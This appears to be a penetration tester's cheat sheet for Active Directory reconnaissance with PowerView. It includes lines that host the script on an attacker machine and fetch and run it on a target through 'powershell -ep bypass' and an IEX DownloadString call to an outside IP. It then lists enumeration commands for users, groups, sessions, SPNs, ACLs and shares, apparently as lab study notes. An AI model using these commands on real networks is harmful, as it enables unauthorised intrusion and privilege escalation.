
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1  
# local  
cd /usr/share/windows-resources/powersploit/Recon/  
python -m http.server 80  
  
# target  
powershell -ep bypass  
IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.167/PowerView.ps1')  
IEX(iwr -uri http://10.10.16.21:81/PowerView.ps1) 
## Domain Info
Get-NetDomain  
  
## Users  
Get-NetUser  
Get-NetUser "fred"  
Get-NetUser | select cn  
Get-NetUser | select cn,pwdlastset,lastlogon  
  
## Groups  
Get-NetGroup | select cn  
Get-NetGroup "Sales Department" | select member  
  
## Computers  
Get-NetComputer   
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion, distinguishedname  
  
## Use Current User to Determine if they have Local Admin privileges on any pc in the domain  
Find-LocalAdminAccess  
  
## Find Logged in Users  
Get-NetSession -ComputerName files04 -Verbose  
  
## Get SPNs  
Get-NetUser -SPN | select samaccountname,serviceprincipalname  
  
## Enumerate ACEs  
```
Get-ObjectAcl -Identity stephanie  
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights  
```
  
## Convert SID to Name  
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-519  
  
## Find Domain Shares  
Find-DomainShare  


## Resolve GUIDS of all Objects 
Get-ObjectAcl –ResolveGUIDs

################


## Scan for interesting abusable permissions

```
Invoke-ACLScanner -ResolveGUIDs
```